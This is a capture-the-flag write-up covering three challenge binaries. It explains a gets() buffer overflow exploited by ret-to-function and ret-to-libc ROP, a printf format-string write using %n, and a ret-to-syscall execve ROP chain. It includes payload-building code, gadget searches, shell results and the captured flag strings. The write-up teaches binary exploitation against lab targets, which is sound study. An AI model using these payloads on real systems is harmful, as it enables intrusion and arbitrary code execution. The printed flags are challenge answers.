# Exploitation

The scripts for the exploits can be found in the `/solutions` folder.

# call_me

The binary implements a text-based quiz based on the lyrics of the song "Call Me", but it uses the `gets()` function, which does not impose any limit on the input length.

The binary has the following mitigations:

```sh
checksec call_me_Federico-Conti

    Arch:       i386-32-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
```

## First Exploit: invoke flag() function

**Static analysis**
  
Using Ghidra it was possible to reconstruct the execution flow by identifying and analyzing the following functions:

Function `quiz()`

- The `quiz()` function implements a simple multi-line quiz, where the user must enter strings that are compared against values present in an array of pointers (`char *lyrics[]`) stored in `.rodata`.
- Input is read using `gets()`, which reads without length limits, making a buffer overflow possible.
- The buffer is 169 bytes, but the input starts from `acStack_c1 + 1`, so in reality 168 bytes are available.
- If the user manages to guess at least 3 correct answers, the program prints the address of the target function `flag()`: 

  ```c++
  printf("&target=%p\n", flag());
  ```

Function `flag()`

The `flag()` function checks whether the 3 integer parameters passed match specific values:

```c++
param_1 == -0x35aa1882  
param_2 == 0x5ca1ab1e   
param_3 == -0x45a145ef  
```

If all three comparisons pass, it prints:

```c
printf("BASC{you_g0t_the_args_right}");
```

Objective

Build an exploit to invoke the `flag()` function with the correct values:

- Exploiting the vulnerability in the `gets()` function.
- Using a single **ret-to-function** to corrupt the execution flow and jump to `flag()`.
- Injecting the correct arguments onto the stack.


### Exploit strategy

1. **Find the EIP Offset**

The buffer size is `169` bytes. It is possible to overwrite EIP and cause a `segmentation fault` to identify the `EIP` offset.

Using a `cyclic pattern` and checking the register values with `gdb`, we identify that EIP is at offset `192+4` bytes.

```sh
pwn cyclic 200

gdb call_me_Federico-Conti
# sending pwn pattern ...

  # check IP register 
  $eip   : 0x62616178 ("xaab"?)

# check offset
pwn cyclic -l xaab
```

2. **Exploit**

Exploit requirements:

- Pass the first 3 lines of the quiz to obtain the address of `flag()`.
- Provide:
  - Padding up to EIP (calculated offset = 192 bytes).
  - New EIP = address of `flag()`.
  - Fake return address required by the calling convention.
  - `param1`, `param2`, `param3` on the stack in the order required by the calling convention.

```sh
payload  = b"a" * OFFSET_EIP     
payload += p32(gadget)            
payload += b"fake"                 
payload += p32(param1_u)
payload += p32(param2_u)
payload += p32(param3_u)
```

## Second Exploit: spawn shell

**Static analysis**

Static analysis through Ghidra revealed the disassembly of the `quiz()` function with the following structure:

```sh
quiz():
    push   ebp
    mov    ebp, esp
    push   ebx        
```

The stack frame includes saving the `EBX` register, which in a `PIE` binary is used as the base for the `GOT`.
Since `EBX` is a callee-saved register according to the System ABI, the function expects it to be restored correctly.
For this reason, the exploit must avoid corrupting `EBX` and place a valid value back onto the stack before the `ret`.

Static analysis also made it possible to obtain:

- the offset of the `flag()` function used to reconstruct the `PIE base`
- the `GOT` offset needed to overwrite `EBX` with a valid value


Objective

Given the presence of a `puts` function in the `PLT` and the presence of `NX`, the chosen strategy is a **ret-to-libc**, directly invoking a syscall `system("/bin/sh")`:

- Leaking the absolute address of `puts` in `libc` to compute the `libc base`.
- Use a  **ROP chain** to call `system("/bin/sh")`.
- Bypassing the mitigations present (NX, PIE).
- Keeping `EBX` uncorrupted to avoid crashes.


### Exploit strategy

1. **Leak the PIE base and GOT**

As in the first exploit, by sending the first 3 correct lines, the `quiz()` function prints an address of an internal function `flag()`.

Knowing the offset of `flag()` relative to the binary base (via Ghidra), we compute the `PIE` base and the `GOT` address.

```sh
pie_base = leak_flagAddr - 0x11ed 
got_addr = pie_base + 0x3fb4 
```

2. **Leak libc**

We use a first **ROP chain** to call `puts@plt(puts@got)` and print the real address of `puts` in `libc`.

This leak allows us to compute the remote libc base (using the provided libc file).

Note: In this `ROP` we must return to the `quiz()` function to avoid breaking the loop and exiting the program after the call to `puts()`.

```sh
payload  = b"a" * OFFSET_EBX
payload += p32(got_addr)           # KEEP EBX UNTOUCHED
payload += b"b" * 4                # padding for EBP
payload += p32(puts_plt)           # EIP -> puts@plt 
payload += p32(quiz)               # return address -> quiz() to repeat the process
payload += p32(puts_got)           # argument for puts@plt
```

After receiving the address of `<puts` from the remote libc and resuming execution of the `quiz()` function, we compute the libc base with the offset of `puts` inside the loaded libc:

```sh
libc_base = leaked_puts_addr - libc.symbols['puts']
```

3. **Exploit**

Knowing `libc_base`, we compute the address of `system` and the `/bin/sh` string.

We prepare a second **ROP chain** that calls `system("/bin/sh")`.

```sh
payload2  = b"A" * OFFSET_EBX
payload2 += p32(got_addr)      # KEEP EBX UNTOUCHED (as if it were a canary)
payload2 += b"B" * 4           # padding for EBP
payload2 += p32(system_addr)   # EIP -> system
payload2 += p32(0)             # return address needed by calling convention
payload2 += p32(binsh_addr)    # argument for system("/bin/sh")
```

### Results

```sh
$ python3 pwn_callme.py REMOTE
    ### output
    BASC{you_g0t_the_args_right}

$ python3 pwn_callme2.py REMOTE
    ### output
    [*] Switching to interactive mode
    $ cat flag.txt
    BASC{GG_U_g0t_411_it_Tak3s_2_4bu5e_libC___20QSLmfr}
```


# the_answer

The binary implements a simple interaction with the user: it asks for a name and prints it using `printf()`.
The binary has the following mitigations:

```sh
checksec the_answer_Federico-Conti

    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found # not needed for the exploit
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
```

**Static analysis**

Analyzing the binary with Ghidra makes it possible to reconstruct the main control flow of `main()`:

```c
puts("What's your name?");
read(0, local_1010, 0x1000);

printf("Hi, ");
printf(local_1010);

if (DAT_00404564 == 0x2a) {
    puts("Exactly! Here's your flag:");
    open("flag.txt");
   ...
}
```

- User input is read with `read()` into a 4096-byte buffer.
- The buffer is passed directly to `printf()` without a format string â†’ **format string vulnerability**.
- The global variable `DAT_00404564` is compared against the value `0x2a`.
- If the condition is true, the program opens and prints the contents of `flag.txt`.

Because PIE is disabled, the address of the global variable is fixed:

- `DAT_00404564 @ 0x404564`

Objective

- Exploit the format string vulnerability in `printf(local_1010)`.
- Write the value `42` to address `0x404564`.
- Trigger the branch that prints the flag.

## Exploit Strategy

1. **Find the format-string offset**

To use `%n`, we need to know the correct stack index that references our input.
We can brute-force with payloads like: `abcd%<i>$lx` and search for the hex value of `abcd` (`0x64636261`) on the stack.

- The result shows the correct offset is: `13`

2. **Write the value with `%n`**

Since `%n` writes the number of characters printed up to that point, we build a format string that:

- Prints exactly 42 characters (`%42c`)
- Writes the value using `%n` to the desired address.

3. **Final payload**

`payload = b'%42c%15$nAAAAAA\x00' + p64(0x404564)`

The final payload is composed of:

1. A format string containing `%42c%<updated_offset>$n`
2. Padding to align to 8 bytes (`A*padding`)
3. `\x00` to terminate `printf` string
4. The address of the global variable (`0x404564`)

```sh

     |--------|--------|--------|--------|--------|--------|--------|--------|
Slot |   %    |  4     |   2    |   c    |   %    |   1    |   5    |   $    |       |
13   |        |        |        |        |        |        |        |        |
     |--------|--------|--------|--------|--------|--------|--------|--------|
Slot |   n    |   A    |   A    |   A    |   A    |   A    |   A    | \x00   | 
14   |        |  PADD  |  PADD  |  PADD  |  PADD  |  PADD  |  PADD  |        |
     |--------|--------|--------|--------|--------|--------|--------|--------|
Slot |   d    |   E    |   @    |  \x00  |  \x00  |  \x00  |  \x00  | \x00   |
15   |  ADDR  |  ADDR  |  ADDR  |  ...   |  ...   |  ...   |  ...   |  ...   |
     |--------|--------|--------|--------|--------|--------|--------|--------|
```

### Results

```sh
$ python3 pwn_theanswer.py REMOTE
    ### output
    ...
    BASC{50_LoNg_&_Thanks_for_4ll_tH3_F1sh___p91duXwi}
```

# rop-test

The analyzed binary implements a simple interactive service that allows the user to check whether an input number is prime.
The binary has the following mitigations:

```sh
checksec rop-test_Federico-Conti

Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)

```

**Static analysis**

By analyzing the binary with Ghidra, it is possible to reconstruct the main control flow of the `prime()` function, highlighting the following critical portion:

- The local buffer is 141 bytes, while `fgets` can read up to 512 bytes.

```c++
char acStack_e9[141];
fgets(acStack_e9 + 1, 0x200, stdin);
```

This results in a **stack-based buffer overflow**, which allows an attacker to:

- overwrite local variables,
- overwrite the saved frame pointer,
- overwrite the return address (RIP).

The check performed via:

```c++
strcmp(acStack_e9 + 1, "/bin/sh") 
```

does not mitigate the vulnerability, because:

- it does not limit the input length,
- it is executed before the function returns,
- it does not prevent the overflow.

Objective

Given the absence of a `system` function in the `PLT` and the presence of `NX`, the chosen strategy is a **ret-to-syscall**, i.e., directly invoking a syscall.

- Build an exploit that leverages the buffer overflow to execute `execve("/bin/sh", NULL, NULL)`.
- Use a **ROP chain** to set the required registers and invoke the syscall.
- Bypass the mitigations present (NX).

## Exploit Strategy

1. **Find the RIP Offset**
   
To find the RIP offset, you can use a cyclic pattern generated with `pwn cyclic` and analyze the core dump with `gdb`.

```sh
pwn cyclic 300
gdb rop-test_Federico-Conti
# sending pwn pattern ...
    # check REB register 
    $reb   : gaachaac 
# check offset
pwn cyclic -l gaachaac
```

The RIP offset turns out to be `224+8` bytes


2. **Preparing the execve syscall**

On x86-64, `execve("/bin/sh", NULL, NULL)` requires:

| Register | Value          |
|----------|----------------|
| RAX      | 59 (SYS_execve)|
| RDI      | `/bin/sh`      |
| RSI      | 0              |
| RDX      | 0              |

The `/bin/sh` string is already present in the binary `.rodata` section (since it is used in the `strcmp` comparison), and its address is known and static (no `PIE`).

3. Find the ROP gadgets

Using a tool like `ropper`, you can identify the gadgets needed to populate the registers for the 64-bit syscall:

- `ropper --file ./rop-test_Federico-Conti --search 'pop rax'`
- `ropper --file ./rop-test_Federico-Conti --search 'pop rdi'`
- `ropper --file ./rop-test_Federico-Conti --search 'pop rsi'`
- `ropper --file ./rop-test_Federico-Conti --search 'pop rdx'`


4. **Building the payload**

The payload is built as follows:

```python
payload  = b"a" * (OFFSET_RIP)  
payload += p64(POP_RAX)
payload += p64(SYSCALL_EXECVE)
payload += p64(POP_RDI) 
payload += p64(BINNASH)
payload += p64(POP_RSI)
payload += p64(0)
payload += p64(0) # align stack for pop rbx;
payload += p64(POP_RDX)
payload += p64(0)
payload += p64(SYSCALL)
```

## Results

```sh
$ python3 pwn_rop.py REMOTE
    ### output
    [*] Switching to interactive mode
    $ cat flag.txt  
    BASC{c0d3_r3U5e_FtW___vGbywEJ1}
```